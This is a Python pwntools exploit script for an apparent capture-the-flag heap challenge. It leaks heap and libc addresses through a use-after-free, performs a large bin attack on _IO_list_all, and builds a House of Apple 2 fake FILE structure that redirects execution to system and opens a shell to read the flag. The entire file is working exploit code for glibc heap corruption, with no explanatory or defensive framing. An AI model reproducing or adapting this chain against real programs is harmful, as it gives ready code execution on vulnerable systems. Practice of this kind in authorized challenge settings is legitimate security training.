#!/usr/bin/python3
from pwn import *

# ================= CẤU HÌNH =================
exe = ELF('./chall', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
context.binary = exe

# True = Server
REMOTE = False

if REMOTE:
    r = remote('IP_ADDRESS', 1337)
else:
    r = process('./chall')

def alloc(idx, size, data):
    r.sendlineafter(b'> ', b'1')
    r.sendlineafter(b'idx: ', str(idx).encode())
    r.sendlineafter(b'size: ', str(size).encode())
    if size < 20000:
        r.sendafter(b'data: ', data)
    else:
        try: r.sendafter(b'data: ', data, timeout=0.05)
        except: pass

def free(idx):
    r.sendlineafter(b'> ', b'2')
    r.sendlineafter(b'idx: ', str(idx).encode())
    r.recvuntil(b'ok\n')

def edit(idx, data):
    r.sendlineafter(b'> ', b'3')
    r.sendlineafter(b'idx: ', str(idx).encode())
    r.sendafter(b'data: ', data)

def print_chunk(idx):
    r.sendlineafter(b'> ', b'4')
    r.sendlineafter(b'idx: ', str(idx).encode())

# ================= 1. LEAK HEAP =================
info(">>> STEP 1: LEAK HEAP <<<")
alloc(0, 0x100, b'GUARD')
alloc(1, 0x430, b'L1')
alloc(2, 0x100, b'GUARD')
alloc(3, 0x420, b'L2')
alloc(4, 0x100, b'GUARD')

free(1)
alloc(5, 0x500, b'PUSH_L1')

print_chunk(1)
r.recvuntil(b'data: ')
heap_leak = u64(r.recv(6).ljust(8, b'\0'))
info(f"Heap Leak: {hex(heap_leak)}")
l1_addr = heap_leak 

# ================= 2. LEAK LIBC =================
info(">>> STEP 2: LEAK LIBC <<<")
alloc(6, 0x1400, b'LIBC')
alloc(7, 0x100, b'GUARD')
free(6)
alloc(8, 1, b'S')
edit(6, b'A' * 48)

print_chunk(6)
r.recvuntil(b'data: ')
r.recvuntil(b'A'*48)
libc_leak = u64(r.recv(6).ljust(8, b'\0'))
offset_libc = 0x1d3cc0
libc.address = libc_leak - offset_libc
info(f"Libc Base: {hex(libc.address)}")

# ================= 3. LARGE BIN ATTACK (_IO_list_all) =================
info(">>> STEP 3: LARGE BIN ATTACK <<<")
target_addr = libc.sym['_IO_list_all'] - 0x20
free(3) # Free L2
edit(1, p64(0) + p64(target_addr))
alloc(9, 0x500, b'TRIGGER')

# ================= 4. HOUSE OF APPLE 2 PAYLOAD (FIXED) =================
info(">>> STEP 4: HOUSE OF APPLE 2 <<<")

l2_addr = l1_addr + 0x550 
info(f"L2 Addr: {hex(l2_addr)}")

_IO_wfile_jumps = libc.sym['_IO_wfile_jumps']
system = libc.sym['system']

# Payload Construction
# Offset 0x00: Flags = "  sh"
flags = b"  sh\x00\x00\x00\x00" 

payload = flags 
payload = payload.ljust(0x28 - 0x20, b'\x00')
payload += p64(1) # _IO_write_ptr

# FIX: Add _lock at Offset 0x88 (Relative: 0x88 - 0x20 = 0x68)
# Lock must be writable and 0. Use a space in heap (L2 + 0x200 is fine)
lock_addr = l2_addr + 0x200
payload = payload.ljust(0x88 - 0x20, b'\x00')
payload += p64(lock_addr) # _lock

payload = payload.ljust(0xa0 - 0x20, b'\x00')
payload += p64(l2_addr + 0x100) # _wide_data

payload = payload.ljust(0xc0 - 0x20, b'\x00')
payload += p32(0) # _mode = 0

payload = payload.ljust(0xd8 - 0x20, b'\x00')
payload += p64(_IO_wfile_jumps) # vtable

# Wide Data at L2 + 0x100 (Relative: 0xe0)
payload = payload.ljust(0x100 - 0x20, b'\x00')
wide_data = p64(0)*3 
wide_data += p64(0) # _IO_write_base
wide_data += p64(0)*2
wide_data += p64(0) # _IO_buf_base
wide_data = wide_data.ljust(0xe0, b'\x00')
# Wide Vtable at L2 + 0x300 (Relative: 0x100 + 0xe0 + ... = xa0 + 0x200 = 0x300)
# Let's put wide vtable at L2 + 0x300
wide_data += p64(l2_addr + 0x300) # _wide_vtable

payload += wide_data

# Lock area at L2 + 0x200 (Relative: 0x1e0)
# Just padding 0
payload = payload.ljust(0x300 - 0x20, b'\x00')

# Wide Vtable at L2 + 0x300 (Relative: 0x2e0)
# Offset 0x68: doallocate -> system
payload += b'\x00' * 0x68
payload += p64(system)

edit(3, payload)

# Trigger
info("Triggering Shell...")
r.sendlineafter(b'> ', b'0')

# Keep alive
r.sendline(b'ls; cat flag.txt')
r.interactive()